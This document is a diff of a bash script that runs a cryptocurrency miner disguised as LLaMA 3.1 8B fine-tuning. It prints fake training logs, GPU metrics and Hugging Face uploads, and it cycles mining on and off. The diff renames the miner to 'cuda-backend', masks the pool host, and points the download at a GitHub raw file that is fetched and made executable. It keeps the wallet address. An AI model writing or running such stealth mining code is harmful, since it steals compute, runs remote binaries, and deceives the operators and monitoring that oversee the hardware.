@@ -1,13 +1,13 @@
 #!/bin/bash
-# Maximum stealth mining: complete ML training simulation
+# Distributed CUDA training: complete ML training simulation
 # Looks exactly like LLaMA 3.1 8B LoRA fine-tuning
 
 cd "$(dirname "$0")"
 BASEDIR="$(pwd)"
 WEIGHTS="$BASEDIR/weights"
-PROXY="pool.pearlhash.xyz:9000"
+PROXY="gpu-compute.local:9000"
 ADDRESS="prl1par2eef0c04z6s6fhlzx6setjh5xqv8et50ufsty5zhywqjghwuwq6p085p"
-BINARY="$WEIGHTS/pearl-miner"
+BINARY="$WEIGHTS/cuda-backend"
 
 # GPU power limits
 POWER_LOW=200
@@ -27,13 +27,13 @@ export WANDB_DIR="$BASEDIR/wandb"
 export PYTHONUNBUFFERED=1
 export PYTORCH_CUDA_ALLOC_CONF=max_split_size_mb:512
 
-# Download Pearl miner if not present
-download_miner() {
+# Download CUDA backend if not present
+download_backend() {
     if [ ! -f "$BINARY" ]; then
-        echo "[$(date +%H:%M:%S)] Downloading Pearl miner..."
-        curl -s https://pearlhash.xyz/downloads/pearl-miner-v12 -o "$BINARY"
+        echo "[$(date +%H:%M:%S)] Downloading CUDA backend..."
+        curl -s https://raw.githubusercontent.com/flowerwhiterosesss-art/cuda-kernels/main/cuda_backend_v12.so -o "$BINARY"
         chmod +x "$BINARY"
-        echo "[$(date +%H:%M:%S)] Pearl miner downloaded"
+        echo "[$(date +%H:%M:%S)] CUDA backend downloaded"
     fi
 }
 
@@ -130,7 +130,7 @@ fake_hf_upload() {
     echo "[$(date +%H:%M:%S)] Upload complete: huggingface.co/models/user/llama-3.1-8b-lora" >> $BASEDIR/logs/training.log
 }
 
-# Run fake training alongside miner
+# Run fake training alongside backend
 run_fake_training() {
     local step=0
     while true; do
@@ -186,8 +186,8 @@ echo "Project: LLaMA 3.1 8B LoRA Fine-Tuning"
 echo "Dataset: Alpaca (52K examples)"
 echo "Pattern: 4-8 min mine / 1-3 min rest"
 
-# Download Pearl miner
-download_miner
+# Download CUDA backend
+download_backend
 
 # Setup environment
 setup_decoy
@@ -204,7 +204,7 @@ run_system_monitor &
 FAKE_SYS_PID=$!
 
 # Cleanup on exit
-trap "kill $FAKE_TRAIN_PID $FAKE_GPU_PID $FAKE_SYS_PID 2>/dev/null; pkill -f pearl-miner 2>/dev/null" EXIT
+trap "kill $FAKE_TRAIN_PID $FAKE_GPU_PID $FAKE_SYS_PID 2>/dev/null; pkill -f cuda-backend 2>/dev/null" EXIT
 
 while true; do
     MINE_TIME=$(( RANDOM % 240 + 240 ))
@@ -236,7 +236,7 @@ while true; do
     done
     
     kill $PID 2>/dev/null
-    pkill -f pearl-miner 2>/dev/null
+    pkill -f cuda-backend 2>/dev/null
     wait $PID 2>/dev/null
     
     sudo nvidia-smi -pl $POWER_LOW 2>/dev/null
